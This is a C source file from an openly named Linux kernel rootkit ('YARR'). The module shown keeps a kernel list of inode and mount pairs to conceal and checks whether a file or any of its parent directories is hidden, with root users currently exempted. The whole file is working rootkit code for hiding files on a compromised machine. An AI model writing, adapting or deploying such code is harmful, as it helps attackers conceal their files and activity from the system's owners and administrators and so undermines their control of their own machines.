/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/string.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/fcntl.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/mount.h>

#include "hidefile.h"
#include "debug.h"
#include "funcs.h"

// We maintain a list of inodes we are hidding and mountpoints identifier. An
// inode number is unique just within one filesystem, but it could be repeated
// between two different mounted filesystems so to identify it we use the
// struct vfsmount mnt_id property and the struct inode i_ino property.
struct hide_file {
	struct list_head list;
	long i_ino;
	int mnt_id;
} hide_files_list;

/***
 * For debugging purposes. Prints the list of files.
 */
void print_hide_files(void) {
	struct list_head *pos;
	struct hide_file *curr;

	debug("Hidden files: [\n");
	list_for_each(pos, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		debug("\tinode: %ld, mount_id:%d\n", curr->i_ino, curr->mnt_id);
	}

	debug("]\n");
	return;
}

void init_hidefile() {
	INIT_LIST_HEAD(&hide_files_list.list);
}

void exit_hidefile() {
	struct list_head *pos, *n;
	struct hide_file *curr;
	
	// Free all the memory taken for the active hidden files.
	list_for_each_safe(pos, n, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		list_del(pos);
		kfree(curr);
	}
}

int hideFile(const char __user *filename) {
	int res = -1;
	struct hide_file *tmp;
	struct path path;

	// Allocate a new struct hide_file structure to maintain this new inode,
	// just if it wasn't previously hide.
	if (!isFileHidden(filename)) {
		tmp = (struct hide_file *)kmalloc(sizeof(struct hide_file), GFP_KERNEL);

		// TODO: This makes a second path lookup (previously made in
		// isFileHidden()), maybe we should optimize this. Hope dcache is
		// really optimized :).
		if (user_path(filename, &path) != 0) {
			debug("hideFile: Weird error with user_path(%s, path).\n",
				  filename);
			return res;
		}

		tmp->i_ino = path.dentry->d_inode->i_ino;
		tmp->mnt_id = path.mnt->mnt_id;
		list_add(&(tmp->list), &(hide_files_list.list));
		res = 0;
	}

	print_hide_files();
	return res;
}

int stopHideFile(const char __user *filename) {
	int res = -1;
	struct list_head *pos, *n;
	struct hide_file *curr;
	struct path path;
	
	if (user_path(filename, &path) != 0) {
		debug("stopHideFile: Weird error with user_path(%s, path).\n",
			  filename);
		return res;
	}

	// Search the file passed inside the list, if we find it then remove it
	// from the list.
	list_for_each_safe(pos, n, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		if (curr->i_ino == path.dentry->d_inode->i_ino &&
			curr->mnt_id == path.mnt->mnt_id) {
			list_del(pos);
			kfree(curr);
			res = 0;
		}
	}

	print_hide_files();
	return res;
}

int isFileHidden(const char __user *filename) {
	struct list_head *pos;
	struct hide_file *curr;
	int res = 0;
	struct path path;
	int file_mnt_id;
	long file_i_ino;
	struct dentry *parent;
	int i;

	// Get the path of this filename.
	if (user_path(filename, &path) != 0) {
		// debug("isFileHidden: Weird error with user_path(%s, path).\n",
		//	  filename);
		return res;
	}

	// Get the properties we are interested in (check struct hide_file).
	file_mnt_id = path.mnt->mnt_id;
	file_i_ino = path.dentry->d_inode->i_ino;

	// Iterate over the list checking if the file itself is hidden or if any of
	// its ascendants is hidden.
	list_for_each(pos, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);

		// Is this file being hidden?.
		if (curr->i_ino == file_i_ino && curr->mnt_id == file_mnt_id) {
			res = 1;
			break;
		}

		// Is any of its ascendants being hidden?.
		i = 0;
		parent = path.dentry->d_parent;
		while (parent != NULL) {
			if (curr->i_ino == parent->d_inode->i_ino &&
				curr->mnt_id == file_mnt_id) {
				res = 1;
				break;
			}

			parent = parent->d_parent;

			if (i == 100)
				break;
			i++;
		}

		if (res == 1)
			break;
	}

	// TODO: Right now root can find every file, of course this would change
	// in the future.
	// Even a file being hidden is revealed if one of these conditions meet:
	// - Root is looking for it (root privileges in fact).
	if (current->cred->euid == 0)
		res = 0;

	return res;
}

